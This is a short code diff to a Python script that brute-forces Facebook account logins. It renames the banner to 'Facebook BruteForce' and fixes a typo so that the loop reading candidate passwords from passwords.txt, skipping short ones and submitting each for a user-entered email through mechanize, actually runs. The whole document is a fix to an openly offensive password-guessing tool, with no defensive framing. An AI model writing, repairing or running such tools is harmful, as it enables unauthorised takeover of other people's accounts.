@@ -24,7 +24,7 @@ except:
 	print('\n\tPlease install mechanize.\n')
 	sys.exit()
 
-print('\n---------- Welcome To FaceForce ----------\n')
+print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('passwords.txt','r')
 
 email=str(raw_input('Enter Email/Username : ').strip())
@@ -37,7 +37,7 @@ while file:
 	passw=file.readline().strip()
 	i+=1
 	if len(passw) < 6:
-		contunue
+		continue
 	print str(i) +" : ",passw
 	response = browser.open(post_url)
 	try:
